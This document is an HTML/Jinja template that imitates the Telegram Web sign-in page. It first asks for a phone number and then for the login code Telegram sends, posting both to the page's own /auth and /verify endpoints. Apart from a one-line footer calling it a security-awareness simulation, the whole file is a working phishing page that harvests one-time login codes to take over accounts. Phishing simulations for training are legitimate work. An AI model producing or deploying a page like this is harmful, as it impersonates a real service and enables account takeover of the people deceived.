<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Telegram Web</title>
<style>
  :root{--blue:#2481cc;--bg:#ffffff;--txt:#121212;--sub:#707579}
  *{box-sizing:border-box;font-family:-apple-system,Roboto,Helvetica,Arial,sans-serif}
  body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:#e6ebee}
  .card{width:360px;max-width:92vw;background:var(--bg);border-radius:12px;
        box-shadow:0 2px 12px rgba(0,0,0,.15);padding:32px;text-align:center}
  .logo{width:80px;height:80px;border-radius:50%;background:var(--blue);
        margin:0 auto 20px;display:flex;align-items:center;justify-content:center;color:#fff;
        font-size:38px}
  h1{font-size:18px;color:var(--txt);margin:0 0 6px}
  p{font-size:14px;color:var(--sub);margin:0 0 22px;line-height:1.5}
  input{width:100%;padding:12px;border:1px solid #dfe1e5;border-radius:8px;
        font-size:16px;text-align:center;outline:none}
  input:focus{border-color:var(--blue)}
  button{width:100%;margin-top:16px;padding:12px;border:0;border-radius:8px;
         background:var(--blue);color:#fff;font-size:15px;cursor:pointer}
  button:hover{background:#1f6fb2}
  .foot{margin-top:18px;font-size:12px;color:var(--sub)}
</style>
</head>
<body>
  <div class="card">
    <div class="logo">✈️</div>
    {% if step == "phone" %}
      <h1>Sign in to Telegram</h1>
      <p>Please confirm your country code<br>and enter your phone number.</p>
      <form method="POST" action="/auth" autocomplete="off">
        <input name="phone" placeholder="+1 555 000 0000" required>
        <button type="submit">Next</button>
      </form>
    {% else %}
      <h1>Enter code</h1>
      <p>We've sent the code to your<br>Telegram app on {{ phone }}.</p>
      <form method="POST" action="/verify" autocomplete="off">
        <input type="hidden" name="phone" value="{{ phone }}">
        <input name="code" placeholder="Login code" inputmode="numeric" required>
        <button type="submit">Sign in</button>
      </form>
    {% endif %}
    <div class="foot">This is a security-awareness simulation.</div>
  </div>
</body>
</html>
